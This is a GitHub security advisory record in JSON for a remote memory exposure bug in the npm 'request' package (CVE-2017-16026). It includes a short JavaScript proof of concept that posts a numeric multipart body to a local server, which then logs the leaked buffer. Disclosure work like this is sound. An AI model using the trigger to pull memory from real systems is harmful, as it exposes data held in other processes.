        content_length: 2401
        body: '{"id":"GHSA-7xfp-9c55-5vqj","summary":"Remote Memory Exposure in request","details":"Affected versions of `request` will disclose local system memory to remote systems in certain circumstances. When a multipart request is made, and the type of `body` is `number`, then a buffer of that size will be allocated and sent to the remote server as the body.\n\n## Proof of Concept\n\n```js\nvar request = require(''request'');\nvar http = require(''http'');\n\nvar serveFunction = function (req, res){\n\treq.on(''data'', function (data) {\n            console.log(data)\n        });\n\tres.end();\n};\nvar server = http.createServer(serveFunction);\nserver.listen(8000);\n\nrequest({\n\tmethod: \"POST\",\n\turi: ''http://localhost:8000'',\n\tmultipart: [{body:500}]\n},function(err,res,body){});\n```\n\n\n## Recommendation\n\nUpdate to version 2.68.0 or later","aliases":["CVE-2017-16026"],"modified":"2023-11-08T03:59:00.437371Z","published":"2018-11-09T17:44:01Z","database_specific":{"severity":"MODERATE","github_reviewed":true,"github_reviewed_at":"2020-06-16T21:23:42Z","nvd_published_at":null,"cwe_ids":["CWE-201"]},"references":[{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2017-16026"},{"type":"WEB","url":"https://github.com/request/request/issues/1904"},{"type":"WEB","url":"https://github.com/request/request/pull/2018"},{"type":"WEB","url":"https://github.com/request/request/pull/2022"},{"type":"WEB","url":"https://github.com/request/request/commit/29d81814bc16bc79cb112b4face8be6fc00061dd"},{"type":"PACKAGE","url":"https://github.com/request/request"}],"affected":[{"package":{"name":"request","ecosystem":"npm","purl":"pkg:npm/request"},"ranges":[{"type":"SEMVER","events":[{"introduced":"2.49.0"},{"fixed":"2.68.0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2018/11/GHSA-7xfp-9c55-5vqj/GHSA-7xfp-9c55-5vqj.json"}},{"package":{"name":"request","ecosystem":"npm","purl":"pkg:npm/request"},"ranges":[{"type":"SEMVER","events":[{"introduced":"2.2.6"},{"fixed":"2.68.0"}]}],"database_specific":{"last_known_affected_version_range":"\u003c 2.47.0","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2018/11/GHSA-7xfp-9c55-5vqj/GHSA-7xfp-9c55-5vqj.json"}}],"schema_version":"1.9.0","severity":[{"type":"CVSS_V3","score":"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"}]}'
